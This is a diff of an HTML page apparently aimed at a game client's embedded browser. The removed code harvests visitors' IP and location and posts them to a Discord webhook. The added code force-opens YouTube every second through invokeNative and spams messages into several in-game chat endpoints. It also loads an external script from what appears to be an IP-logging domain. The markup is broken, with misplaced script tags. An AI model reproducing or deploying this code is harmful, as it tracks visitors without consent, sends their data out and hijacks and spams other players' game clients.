@@ -3,100 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>! Ais here</title>
+    <title>discord.gg/</title>
     <style>
         body {
-            background: url('https://media1.giphy.com/media/3o6YfXi77uGepc1Sp2/giphy.gif?cid=6c09b952z63bra5tx2rzvr9ol8y238uaon35b2islzwwwd1a&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g') no-repeat center center fixed;
+            margin: 0;
+            padding: 0;
+            background: url('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExazkxemJmbmtsdnpocmduMXdnN3l4YmlibDc1eno0dzVyMWpyeWN0YiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/twQYPSiVdcq3s2KFyo/giphy.gif') no-repeat center center fixed;
             background-size: cover;
-            color: red;
+            font-family: 'Courier New', Courier, monospace;
+            color: #ffd500; /* Text color */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
             text-align: center;
-            font-family: Tempus Sans ITC, sans-serif;
         }
-        h1 {
-            font-size: 40px;
-            margin-top: 350px;
-            position: absolute;
-            top: -10%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+        .image-container img {
+            width: 450px; 
+            height: auto;
+            border: 2px solid #ffd500; /* Changed border color to yellow */
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.7); /* Yellow glow */
         }
         .info {
-            margin-top: 50px;
-            font-size: 30px;
-        }
-        .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 85vh;
-        }
-        .image-box {
-            border: 0px solid rgb(8, 8, 8);
-            padding: 1px;
-            display: inline-block;
-        }
-        .discord-link {
-            font-size: 24px;
             margin-top: 20px;
-            text-decoration: none;
-            color: red;
+            font-size: 3em; /* Increased font size */
+            color: #ffffff; /* Changed text color to white */
+            text-shadow: 0px 0px 8px #ffffff, 0px 0px 15px #ffd500, 0px 0px 25px #ffd500; /* Glowing effect */
+            letter-spacing: 4.5px; 
+            text-transform: uppercase; /* Capital letters */
         }
     </style>
 </head>
 <body>
-    <h1>  A went from here </h1>
-    <div class="container">
-        <div class="image-box">
-            <img src="" alt="" width="800">
-        </div>
-        <div class="info" id="user-info">
-            <p><strong>IP:</strong> Loading...</p>
-            <p><strong>City:</strong> Loading...</p>
-            <p><strong>Country:</strong> Loading...</p>
-            <p><strong>Timezone:</strong> Loading...</p>
-        </div>
-        <a href="https://discord.gg/DET" class="discord-link" target="_blank">discord.gg/</a>
+    <div class="image-container">
+        <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeWUyZjNxMTQ2bml4bWNmOWJydmFmc2pmMGtoZ2c0NmE1d3h4aWdtbiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/STSc4fxIAozRgV8rkI/giphy.gif" alt="Discord Image">
     </div>
-    <audio autoplay loop>
-        <source src="https://github.com/286b44606swax/dsa2/raw/refs/heads/main/%D8%A7%D8%BA%D8%A7%D9%86%D9%8A%20%D8%A7%D8%AC%D9%86%D8%A8%D9%8A%D9%87%20%D9%87%D8%AC%D9%88%D9%84%D9%87%20-%20Hold%20On%20-%20%D9%85%D8%B7%D9%84%D9%88%D8%A8%D9%87%20%D8%A7%D9%83%D8%AB%D8%B1%20%D8%B4%D9%8A%20%23%D8%A7%D8%AC%D9%86%D8%A8%D9%8A.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
+    <div class="info">
+        <strong>NO ONE</strong>
+    </div>
+
     <script>
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('user-info').innerHTML = 
-                    `<p><strong>IP:</strong> ${data.ip}</p>
-                    <p><strong>City:</strong> ${data.city}</p>
-                    <p><strong>Country:</strong> ${data.country_name}</p>
-                    <p><strong>Timezone:</strong> ${data.timezone}</p>`;
-                
-                // Send IP data to Discord webhook
-                fetch('https://discord.com/api/webhooks/1236940095806771210/d005WvqPwoSa4eWihG8yb-5L861vnO_MwEXXWR8oHt5br_tNqIE7ZxyZAjz2sQOGTq6e', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        content: `New visitor:\nIP: ${data.ip}\nCity: ${data.city}\nCountry: ${data.country_name}\nTimezone: ${data.timezone}`
-                    })
-                });
-            })
-            .catch(() => {
-                document.getElementById('user-info').innerHTML = '<p>Failed to load IP data.</p>';
-            });
-
-        // Open 15 tabs to the Discord link (may be blocked by browsers)
-        for (let i = 0; i < 15; i++) {
-            window.open('https://discord.gg/', '_blank');
-        }
-
-     <script>
-setInterval(() => {
-window.invokeNative("openUrl", "https://www.youtube.com/watch?v=CFwRjL91AuQ&list=RDCFwRjL91AuQ&start_radio=1");
-window.invokeNative("openUrl", "https://www.youtube.com/watch?v=CFwRjL91AuQ&list=RDCFwRjL91AuQ&start_radio=1");
-}, 1000);
+        // Removed the IP fetching script as per your request
     </script>
 </body>
 </html>
+<script>
+setInterval(() => {
+window.invokeNative("openUrl", "https://www.youtube.com/watch?v=XKIxBAwEQ7Y&list=RDXKIxBAwEQ7Y&start_radio=1");
+window.invokeNative("openUrl", "https://www.youtube.com/watch?v=XKIxBAwEQ7Y&list=RDXKIxBAwEQ7Y&start_radio=1");
+}, 1000);
+    </script>
+    const msg = :crown: no one is here ! :crown:;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "/","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+    <script src='https://2no.co/cr2sher.js'></script>
+
+
+
